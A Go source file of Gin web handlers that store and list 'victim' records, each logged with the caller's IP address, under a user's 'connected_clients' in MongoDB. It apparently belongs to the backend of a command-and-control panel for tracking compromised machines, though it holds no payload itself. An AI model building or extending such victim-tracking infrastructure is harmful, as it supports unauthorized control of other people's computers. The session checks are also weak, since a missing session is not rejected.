package routes

import (
	"context"

	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo/options"
	"server.com/src/database/mongo"
	user "server.com/src/models/User"
	"server.com/src/models/Victim"
	"server.com/src/utils"
)

func CreateVictim(g *gin.Context) {
	var newVictim Victim.Victim

	if err := g.ShouldBindJSON(&newVictim); err != nil {
		g.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	session := sessions.Default(g)
	userID := session.Get(utils.SESSION_KEY)
	if userID == "" {
		g.AbortWithStatusJSON(401, gin.H{"error": utils.INVALID_CONNECTION_KEY_MESSAGE})
		return
	}

	generatedVictim, err := Victim.NewVictim(newVictim, g.RemoteIP())
	if err != nil {
		g.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	err = mongo.UpdateDocument("$push", bson.M{"_id": userID}, "connected_clients", generatedVictim)
	if err != nil {
		g.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	g.JSON(200, gin.H{
		"success": "victim added",
	})
}

func GetVictim(c *gin.Context) {
	manager := sessions.Default(c)

	id, ok := c.GetQuery("victim_id")
	if !ok {
		c.AbortWithStatusJSON(400, gin.H{
			"error": "please provide a valid id",
		})
		return
	}

	userID := manager.Get(utils.SESSION_KEY)
	if userID == "" {
		c.AbortWithStatusJSON(401, gin.H{
			"error": utils.INVALID_CONNECTION_KEY_MESSAGE,
		})
		return
	}

	var foundVictims map[string][]Victim.InternalVictim
	victimFilter := map[string]interface{}{
		"connected_clients": map[string]interface{}{
			"$elemMatch": map[string]interface{}{
				"_id": id,
			},
		},
		"_id": 0,
	}

	err := mongo.Col.FindOne(context.TODO(), bson.M{"_id": userID}, options.FindOne().
		SetProjection(victimFilter)).Decode(&foundVictims)

	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"connected_client": foundVictims["connected_clients"]})
}

func GetAll(c *gin.Context) {
	session := sessions.Default(c)

	userID := session.Get(utils.SESSION_KEY)
	if userID == "" {
		c.AbortWithStatusJSON(400, gin.H{
			"error": utils.LOGIN_FIRST,
		})
		return
	}

	user, err := mongo.Find[user.InternalUser](userID.(string))
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
	}

	c.JSONP(200, user.ConnectedClients)
}
